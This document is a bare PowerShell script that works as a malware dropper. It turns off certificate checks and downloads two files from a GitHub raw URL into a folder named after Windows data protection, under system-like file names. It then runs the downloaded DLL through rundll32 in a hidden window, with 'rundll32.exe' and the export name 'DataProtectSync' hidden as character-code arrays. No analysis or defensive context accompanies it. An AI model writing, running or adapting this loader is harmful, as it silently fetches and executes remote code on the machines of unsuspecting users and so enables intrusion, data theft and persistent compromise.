$p="$env:APPDATA\Microsoft\Protect"
if(!(Test-Path $p)){[void](mkdir $p -Force)}
[Net.ServicePointManager]::SecurityProtocol=3072
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
$wc=New-Object Net.WebClient
$u='https://raw.githubusercontent.com/haha150/temp/main'
$wc.DownloadFile("$u/nlaapi.bin","$p\nlaapi.bin")
$d="$p\wbemcomn.dat"
$wc.DownloadFile("$u/svc.dat",$d)
$e=-join[char[]](114,117,110,100,108,108,51,50,46,101,120,101)
$m=-join[char[]](68,97,116,97,80,114,111,116,101,99,116,83,121,110,99)
Start-Process $e "$d,$m" -WindowStyle Hidden
